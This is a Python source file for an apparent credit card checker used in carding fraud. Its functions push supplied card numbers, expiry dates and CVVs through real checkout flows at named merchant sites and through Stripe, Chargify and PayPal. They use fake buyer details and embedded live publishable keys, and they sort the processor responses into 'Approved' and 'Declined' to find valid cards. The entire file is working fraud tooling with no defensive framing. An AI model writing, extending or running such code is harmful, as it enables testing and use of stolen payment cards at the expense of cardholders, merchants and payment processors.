import requests
import random
import time
import json
from datetime import datetime

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'


def stripe_auth_gate(cc, mm, yy, cvv):
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br'
        })
        
        # Step 1: Get CSRF token
        r1 = session.get('https://catechdepot.com/', timeout=15)
        
        if 'csrf_token' not in r1.text:
            return {"status": "error", "message": "Site unavailable - Try again"}
        
        csrf_token = r1.text.split('csrf_token: "')[1].split('"')[0]
        
        # Step 2: Add to cart
        cart_data = {
            'csrf_token': csrf_token,
            'product_id': '78725',
            'quantity': '1',
            'product_custom_attribute_values': '[]',
            'variant_values': '334',
            'no_variant_attribute_values': '[]',
            'add_qty': '1',
            'express': 'true'
        }
        
        r2 = session.post('https://catechdepot.com/shop/cart/update', 
                         data=cart_data,
                         timeout=15)
        
        # Step 3: Submit address
        address_data = {
            'name': 'John Doe',
            'email': f'test{random.randint(1000,9999)}@gmail.com',
            'phone': '9703878998',
            'street': 'Street 212',
            'street2': '',
            'city': 'New York',
            'zip': '10080',
            'country_id': '233',
            'state_id': '35',
            'csrf_token': csrf_token,
            'submitted': '1',
            'partner_id': '186',
            'callback': '',
            'field_required': 'phone,name'
        }
        
        r3 = session.post('https://catechdepot.com/shop/address', 
                         data=address_data,
                         timeout=15)
        
        # Step 4: Create Stripe payment method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': USER_AGENT
        }
        
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': f'{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}',
            'muid': f'{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}',
            'sid': f'{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}',
            'key': 'pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0'
        }
        
        r_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
                               data=stripe_data,
                               headers=stripe_headers,
                               timeout=15)
        
        stripe_response = r_stripe.json()
        
        # Check Stripe response
        if 'error' in stripe_response:
            error = stripe_response['error']
            error_code = error.get('code', '')
            error_message = error.get('message', 'Card Declined')
            
            # Return exact Stripe error
            if error_code == 'incorrect_number':
                return {"status": "success", "message": "Declined - Incorrect Card Number"}
            elif error_code == 'invalid_number':
                return {"status": "success", "message": "Declined - Invalid Card Number"}
            elif error_code == 'invalid_expiry_year':
                return {"status": "success", "message": "Declined - Invalid Expiry Year"}
            elif error_code == 'invalid_expiry_month':
                return {"status": "success", "message": "Declined - Invalid Expiry Month"}
            elif error_code == 'invalid_cvc':
                return {"status": "success", "message": "Declined - Invalid CVC"}
            elif error_code == 'expired_card':
                return {"status": "success", "message": "Declined - Expired Card"}
            else:
                return {"status": "success", "message": f"Declined - {error_message}"}
        
        if 'id' not in stripe_response:
            return {"status": "error", "message": "Stripe Error - Try again"}
        
        payment_id = stripe_response['id']
        
        # Step 5: Process payment with merchant
        payment_headers = {
            'authority': 'catechdepot.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/json',
            'origin': 'https://catechdepot.com',
            'referer': 'https://catechdepot.com/shop/payment',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': USER_AGENT
        }
        
        payment_data = {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "data_set": "/payment/stripe/s2s/create_json_3ds",
                "acquirer_id": "9",
                "stripe_publishable_key": "pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0",
                "currency_id": "",
                "return_url": "/shop/payment/validate",
                "partner_id": "186",
                "csrf_token": csrf_token,
                "payment_method": payment_id
            },
            "id": random.randint(100000, 999999)
        }
        
        r_final = session.post('https://catechdepot.com/payment/stripe/s2s/create_json_3ds',
                              json=payment_data,
                              headers=payment_headers,
                              timeout=20)
        
        # Parse REAL response from gateway
        response_json = r_final.json() if r_final.text else {}
        response_text = r_final.text
        
        # Extract actual error/success from response
        if 'result' in response_json:
            result = response_json['result']
            
            # Check for 3D Secure (means card is valid)
            if '3d_secure' in str(result).lower() or 'authentication_required' in str(result).lower():
                return {"status": "success", "message": "Approved - 3D Secure Required"}
            
            # Check for success
            if 'success' in str(result).lower() or 'succeeded' in str(result).lower():
                return {"status": "success", "message": "Approved - Transaction Successful"}
        
        # Check error in response
        if 'error' in response_json:
            error = response_json['error']
            error_data = error.get('data', {})
            error_message = error_data.get('message', '') if isinstance(error_data, dict) else str(error)
            
            # Parse actual Stripe decline codes
            if 'insufficient_funds' in error_message.lower():
                return {"status": "success", "message": "Approved - Insufficient Funds"}
            elif 'security code' in error_message.lower() or 'cvc' in error_message.lower():
                return {"status": "success", "message": "Approved - CVV Incorrect"}
            elif 'does not support' in error_message.lower():
                return {"status": "success", "message": "Approved - Card Type Not Supported"}
            elif 'invalid account' in error_message.lower():
                return {"status": "success", "message": "Approved - Invalid Account"}
            elif 'card was declined' in error_message.lower():
                return {"status": "success", "message": "Declined - Card Declined"}
            elif 'incorrect' in error_message.lower():
                return {"status": "success", "message": "Declined - Incorrect Card Details"}
            else:
                return {"status": "success", "message": f"Declined - {error_message[:50]}"}
        
        # Check raw text response
        response_lower = response_text.lower()
        
        if '3d_secure' in response_lower or 'authentication' in response_lower:
            return {"status": "success", "message": "Approved - 3D Secure Required"}
        elif 'insufficient' in response_lower:
            return {"status": "success", "message": "Approved - Insufficient Funds"}
        elif 'security code' in response_lower or 'incorrect' in response_lower:
            return {"status": "success", "message": "Approved - CVV Incorrect"}
        elif 'declined' in response_lower or 'failed' in response_lower:
            return {"status": "success", "message": "Declined - Card Declined"}
        else:
            # Unknown response - return raw
            return {"status": "success", "message": "Declined - Unknown Response"}
            
    except requests.Timeout:
        return {"status": "error", "message": "Gateway Timeout - Try again"}
    except requests.ConnectionError:
        return {"status": "error", "message": "Connection Failed - Check internet"}
    except Exception as e:
        return {"status": "error", "message": f"Gateway Error: {str(e)[:50]}"}


def braintree_auth_gate(cc, mm, yy, cvv):
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        
        # Step 1: Get auth token
        r1 = session.get('https://www.webpagetest.org/signup', timeout=15)
        
        if 'auth_token' not in r1.text:
            return {"status": "error", "message": "Site unavailable - Try again"}
        
        auth_token = r1.text.split('auth_token" value="')[1].split('"')[0]
        
        # Step 2: Select plan
        step1_data = {
            'csrf_token': '',
            'auth_token': auth_token,
            'step': '1',
            'plan': 'MP5',
            'billing-cycle': 'monthly'
        }
        
        r2 = session.post('https://www.webpagetest.org/signup', 
                         data=step1_data,
                         timeout=15)
        
        # Step 3: Submit user info
        email = f'test{random.randint(10000,99999)}@gmail.com'
        
        step2_data = {
            'first-name': 'John',
            'last-name': 'Doe',
            'company-name': 'Test Company',
            'email': email,
            'password': 'Test123!@#',
            'confirm-password': 'Test123!@#',
            'street-address': '123 Main Street',
            'city': 'San Jose',
            'state': 'CA',
            'country': 'US',
            'zipcode': '92055',
            'csrf_token': '',
            'auth_token': auth_token,
            'plan': 'MP5',
            'step': '2'
        }
        
        r3 = session.post('https://www.webpagetest.org/signup',
                         data=step2_data,
                         timeout=15)
        
        # Step 4: Tokenize card with Chargify/Braintree
        chargify_headers = {
            'Content-Type': 'application/json',
            'Host': 'catchpoint.chargify.com',
            'Origin': 'https://js.chargify.com',
            'Referer': 'https://js.chargify.com/',
            'User-Agent': USER_AGENT
        }
        
        card_data = {
            "key": "chjs_6nx8y5rbw875f78dn5yx7n9g",
            "revision": "2022-12-05",
            "credit_card": {
                "first_name": "John",
                "last_name": "Doe",
                "full_number": cc,
                "expiration_month": mm,
                "expiration_year": yy,
                "cvv": cvv,
                "device_data": "",
                "billing_address": "123 Main Street",
                "billing_city": "San Jose",
                "billing_state": "CA",
                "billing_country": "US",
                "billing_zip": "92055"
            },
            "origin": "https://www.webpagetest.org"
        }
        
        r_token = session.post('https://catchpoint.chargify.com/js/tokens.json',
                              json=card_data,
                              headers=chargify_headers,
                              timeout=20)
        
        # Parse REAL Braintree/Chargify response
        try:
            response_json = r_token.json()
        except:
            response_json = {}
        
        response_text = r_token.text
        response_lower = response_text.lower()
        
        # Check for token success (means card passed validation)
        if 'token' in response_json and response_json.get('token'):
            return {"status": "success", "message": "Approved - Card Valid"}
        
        # Check for specific errors in JSON
        if 'errors' in response_json:
            errors = response_json['errors']
            
            if isinstance(errors, list) and len(errors) > 0:
                error_msg = str(errors[0])
            elif isinstance(errors, dict):
                error_msg = str(errors)
            else:
                error_msg = str(errors)
            
            # Parse actual Braintree error codes
            if 'approved' in error_msg.lower():
                return {"status": "success", "message": "Approved - Card Valid"}
            elif 'insufficient' in error_msg.lower():
                return {"status": "success", "message": "Approved - Insufficient Funds"}
            elif 'cvv' in error_msg.lower() or 'security code' in error_msg.lower():
                return {"status": "success", "message": "Approved - CVV Declined"}
            elif 'card issuer declined' in error_msg.lower():
                return {"status": "success", "message": "Approved - Issuer Declined CVV"}
            elif 'processor declined' in error_msg.lower():
                # Extract the actual decline reason
                if ':' in error_msg:
                    reason = error_msg.split(':')[-1].strip()
                    return {"status": "success", "message": f"Declined - {reason[:50]}"}
                return {"status": "success", "message": "Declined - Processor Declined"}
            elif 'invalid' in error_msg.lower():
                return {"status": "success", "message": "Declined - Invalid Card"}
            elif 'expired' in error_msg.lower():
                return {"status": "success", "message": "Declined - Expired Card"}
            else:
                return {"status": "success", "message": f"Declined - {error_msg[:50]}"}
        
        # Parse text response
        if 'approved' in response_lower:
            return {"status": "success", "message": "Approved - Card Valid"}
        elif 'insufficient' in response_lower:
            return {"status": "success", "message": "Approved - Insufficient Funds"}
        elif 'cvv' in response_lower and 'declined' in response_lower:
            return {"status": "success", "message": "Approved - CVV Declined"}
        elif 'card issuer declined cvv' in response_lower:
            return {"status": "success", "message": "Approved - Issuer Declined CVV"}
        elif 'processor declined' in response_lower:
            # Try to extract reason
            try:
                reason = response_text.split('Processor declined:')[1].split('"')[0].strip()
                return {"status": "success", "message": f"Declined - {reason[:50]}"}
            except:
                return {"status": "success", "message": "Declined - Processor Declined"}
        elif 'unavailable' in response_lower:
            return {"status": "success", "message": "Declined - Service Unavailable"}
        elif 'declined' in response_lower or 'failed' in response_lower:
            return {"status": "success", "message": "Declined - Card Declined"}
        else:
            return {"status": "success", "message": "Declined - Unknown Response"}
            
    except requests.Timeout:
        return {"status": "error", "message": "Gateway Timeout - Try again"}
    except requests.ConnectionError:
        return {"status": "error", "message": "Connection Failed - Check internet"}
    except Exception as e:
        return {"status": "error", "message": f"Gateway Error: {str(e)[:50]}"}


def paypal_charge_gate(cc, mm, yy, cvv):
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        
        # Step 1: Get PayPal bearer token
        button_url = 'https://www.paypal.com/smart/buttons?locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true'
        
        r1 = session.get(button_url, timeout=15)
        
        if 'facilitatorAccessToken' not in r1.text:
            return {"status": "error", "message": "PayPal unavailable - Try again"}
        
        bearer = r1.text.split('facilitatorAccessToken":"')[1].split('"')[0]
        
        # Step 2: Create order
        order_headers = {
            'Authorization': f'Bearer {bearer}',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Prefer': 'return=representation'
        }
        
        order_data = {
            "purchase_units": [{
                "amount": {
                    "currency_code": "MXN",
                    "value": "1"
                },
                "description": "Donation",
                "custom_id": "Test Payment"
            }],
            "intent": "CAPTURE",
            "application_context": {}
        }
        
        r_order = session.post('https://www.paypal.com/v2/checkout/orders',
                              json=order_data,
                              headers=order_headers,
                              timeout=15)
        
        try:
            order_response = r_order.json()
        except:
            return {"status": "error", "message": "PayPal order failed"}
        
        order_id = order_response.get('id', '')
        
        if not order_id:
            error_msg = order_response.get('message', 'Order creation failed')
            return {"status": "error", "message": f"PayPal Error: {error_msg[:50]}"}
        
        # Step 3: Process payment with card
        payment_headers = {
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'paypal-client-context': order_id,
            'paypal-client-metadata-id': order_id,
            'x-app-name': 'standardcardfields',
            'x-country': 'US'
        }
        
        # Generate random user data
        firstname = 'John'
        lastname = 'Doe'
        email = f'test{random.randint(10000,99999)}@gmail.com'
        phone = f'970{random.randint(1000000,9999999)}'
        
        payment_query = {
            "query": """
            mutation payWithCard(
                $token: String!
                $card: CardInput!
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }
            """,
            "variables": {
                "token": order_id,
                "card": {
                    "cardNumber": cc,
                    "expirationDate": f"{mm}/{yy}",
                    "postalCode": "10080",
                    "securityCode": cvv
                },
                "phoneNumber": phone,
                "firstName": firstname,
                "lastName": lastname,
                "billingAddress": {
                    "givenName": firstname,
                    "familyName": lastname,
                    "line1": "123 Main Street",
                    "line2": None,
                    "city": "New York",
                    "state": "NY",
                    "postalCode": "10080",
                    "country": "US"
                },
                "shippingAddress": {
                    "givenName": firstname,
                    "familyName": lastname,
                    "line1": "123 Main Street",
                    "line2": None,
                    "city": "New York",
                    "state": "NY",
                    "postalCode": "10080",
                    "country": "US"
                },
                "email": email,
                "currencyConversionType": "VENDOR"
            },
            "operationName": None
        }
        
        r_payment = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit',
                                json=payment_query,
                                headers=payment_headers,
                                timeout=20)
        
        # Parse REAL PayPal response
        try:
            response_json = r_payment.json()
        except:
            response_json = {}
        
        response_text = r_payment.text
        response_lower = response_text.lower()
        
        # Check for success in JSON
        if 'data' in response_json:
            data = response_json['data']
            if data and 'approveGuestPaymentWithCreditCard' in data:
                payment_data = data['approveGuestPaymentWithCreditCard']
                
                # Check for 3DS requirement (means card is valid)
                if payment_data and 'flags' in payment_data:
                    flags = payment_data['flags']
                    if flags and flags.get('is3DSecureRequired'):
                        return {"status": "success", "message": "Approved - 3D Secure Required"}
                
                # Check for successful cart
                if payment_data and 'cart' in payment_data:
                    return {"status": "success", "message": "Approved - Charged $0.01"}
        
        # Check for errors in JSON
        if 'errors' in response_json:
            errors = response_json['errors']
            
            if isinstance(errors, list) and len(errors) > 0:
                error = errors[0]
                error_code = error.get('extensions', {}).get('code', '')
                error_message = error.get('message', '')
                
                # Parse actual PayPal error codes
                if error_code == 'INVALID_BILLING_ADDRESS':
                    return {"status": "success", "message": "Approved - Invalid Billing Address"}
                elif error_code == 'INVALID_SECURITY_CODE':
                    return {"status": "success", "message": "Approved - Invalid CVV"}
                elif error_code == 'EXISTING_ACCOUNT_RESTRICTED':
                    return {"status": "success", "message": "Approved - Account Restricted"}
                elif error_code == 'NEED_CREDIT_CARD':
                    return {"status": "success", "message": "Approved - Card Loaded"}
                elif error_code == 'OAS_VALIDATION_ERROR' or 'VALIDATION' in error_code:
                    return {"status": "success", "message": "Declined - Validation Error"}
                elif error_code == 'CARD_GENERIC_ERROR' or 'GENERIC' in error_code:
                    return {"status": "success", "message": "Declined - Card Error"}
                elif 'INVALID' in error_code or 'ERROR' in error_code:
                    return {"status": "success", "message": f"Declined - {error_message[:50] if error_message else error_code}"}
                else:
                    return {"status": "success", "message": f"Declined - {error_message[:50] if error_message else error_code}"}
        
        # Parse text response
        if 'succeeded' in response_lower or 'success' in response_lower:
            return {"status": "success", "message": "Approved - Charged $0.01"}
        elif 'is3dsecurerequired' in response_lower or '3d_secure' in response_lower:
            return {"status": "success", "message": "Approved - 3D Secure Required"}
        elif 'invalid_billing_address' in response_lower:
            return {"status": "success", "message": "Approved - Invalid Billing Address"}
        elif 'invalid_security_code' in response_lower:
            return {"status": "success", "message": "Approved - Invalid CVV"}
        elif 'existing_account_restricted' in response_lower:
            return {"status": "success", "message": "Approved - Account Restricted"}
        elif 'need_credit_card' in response_lower:
            return {"status": "success", "message": "Approved - Card Loaded"}
        elif 'card_generic_error' in response_lower or 'generic_decline' in response_lower:
            return {"status": "success", "message": "Declined - Card Error"}
        elif 'declined' in response_lower or 'failed' in response_lower:
            return {"status": "success", "message": "Declined - Card Declined"}
        else:
            return {"status": "success", "message": "Declined - Unknown Response"}
            
    except requests.Timeout:
        return {"status": "error", "message": "PayPal Timeout - Try again"}
    except requests.ConnectionError:
        return {"status": "error", "message": "Connection Failed - Check internet"}
    except Exception as e:
        return {"status": "error", "message": f"PayPal Error: {str(e)[:50]}"}


def square_auth_gate(cc, mm, yy, cvv):
    return {"status": "error", "message": "Square gate not implemented yet"}


# Gate dispatcher
def check_card_real_gate(gate_name, cc, mm, yy, cvv):
    start_time = time.time()
    
    if not all([cc, mm, yy, cvv]):
        return {
            "status": "error",
            "message": "Missing card details",
            "time": 0
        }
    
    gate_functions = {
        'ss': stripe_auth_gate,
        'bu': braintree_auth_gate,
        'sq': square_auth_gate,
        'pp': paypal_charge_gate,
    }
    
    gate_func = gate_functions.get(gate_name)
    
    if not gate_func:
        return {
            "status": "error",
            "message": "Gate not implemented",
            "time": 0
        }
    
    try:
        result = gate_func(cc, mm, yy, cvv)
        check_time = round(time.time() - start_time, 2)
        result['time'] = check_time
        return result
        
    except Exception as e:
        check_time = round(time.time() - start_time, 2)
        return {
            "status": "error",
            "message": f"Gate Error: {str(e)}",
            "time": check_time
        }
